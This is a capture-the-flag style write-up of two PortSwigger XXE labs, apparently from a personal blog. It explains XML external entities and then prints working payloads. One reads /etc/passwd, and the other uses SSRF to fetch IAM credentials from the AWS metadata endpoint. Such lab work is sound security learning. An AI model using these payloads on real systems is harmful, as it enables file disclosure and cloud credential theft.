### XML-INJECTION (Portswigger labs)


### <u>Meaning of XML injection </u>
   XML means extensible markup language.It is a form of language designed for storing data and transporting data.It uses a tree-like structure for data storage.
It does not use predefined tags like html.Data can be given to describe the data.Xml applies important elements like xml entities,xml elements and
document type definition(DTD).The document type definition allows custom entities to declared within the declaration.There are two forms of custom entity.
- Custom Entities
- Custom External Entities
### Custom entities
For example

     <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
The value "my entity value" can be called with &myentity;
### Custom External entities
  External entities will lead us to the first portswigger challenge.This form of custom entities is declared outside the declaration.The example given below uses the keyword SYSTEM which requires a value in url format e.g file:/// url wrapper to load custom external entities.
For example

     <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
The file url can be used to read files like /etc/passwd etc

### Challenge 1

Challenge description: Read /etc/passwd by  exploiting XXE(XML External Entity)

![2023-10-18_14-29](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ab0f3280-ed81-4eb6-9059-916666c14bc2)

- I explored the site functionalities and I noticed that the site requests data was xml based.

  ![2023-10-18_20-56](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8a1000e6-653c-4296-b08e-7770d7d49c9d)

- I intercepted the check stock request with burpsuite and sent it to the repeater

![2023-10-18_20-59](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4d1cc80c-59a1-4b81-9f77-089634fb91fe)

- To read the file "/etc/passwd", I used this payload from hacktrickz.com

       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
        <stockCheck><productId>
         &example;
        </productId><storeId>1</storeId></stockCheck>
    
- And I got this a response from the server showing the contents of the /etc/passwd file
  
![2023-10-18_21-14![2023-10-18_21-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6252eb19-98b1-4895-8fc0-1585b75c71ea)

- I right clicked on the repeater and showed response in browser and that was how I solved the first challenge

![2023-10-18_21-18](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e722aebe-a491-472b-8447-c14e3e14bf20)

### Challenge 2

Challenge description: Exploiting XXE to get SSRF attacks

![2023-10-18_21-25](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d805517a-8684-402e-b21d-ee368336884e)

- From the challenge description,It was stated that the "check stock" feature parses xml input.I intercepted the the request

![2023-10-18_21-33](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3b38d8ca-55f9-4e6c-9bb3-cbba95a42e38)

- I used this payload to get the secret token of the Amazon Ec2 metadata instance

       <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY example SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
      <stockCheck><productId>&example;</productId><storeId>1</storeId></stockCheck>

- I got this response

![2023-10-18_21-37](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6dda8f15-06c7-42f5-a078-ef7a4ce4521d)

- Challenge solved

![2023-10-18_21-50](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/208c1e52-9adc-409d-a780-9b080b868849)

